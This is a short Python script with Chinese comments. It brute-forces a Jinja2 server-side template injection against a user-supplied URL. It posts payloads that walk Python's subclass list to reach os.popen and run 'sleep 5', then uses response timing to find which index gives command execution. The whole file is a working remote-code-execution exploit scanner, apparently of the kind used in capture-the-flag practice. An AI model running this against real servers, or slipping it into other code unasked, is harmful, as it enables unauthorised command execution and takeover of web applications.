import requests
import time

url = input("url: ")

for i in range(300):
    try:
        # 使用 sleep 命令制造时间延迟来判断是否执行成功
        payload = f'{{{{ "".__class__.__bases__[0].__subclasses__()[{i}].__init__.__globals__["popen"]("sleep 5").read() }}}}'
        # __init__.__globals__["popen"]修改popen为一个不可能的值，则一定不会执行成功，观察是否存在时间盲注
        data = {"code": payload}

        start_time = time.time()
        response = requests.post(url, data=data, timeout=10)
        end_time = time.time()

        execution_time = end_time - start_time

        # 如果执行时间明显延长，说明命令执行成功
        if execution_time > 4:  # 考虑到网络延迟，设置4秒阈值
            print(f"[+] 索引 {i} 可用! 执行时间: {execution_time:.2f}秒")

    except requests.exceptions.Timeout:
        print(f"[+] 索引 {i} 可能可用 (请求超时)")
    except Exception as e:
        pass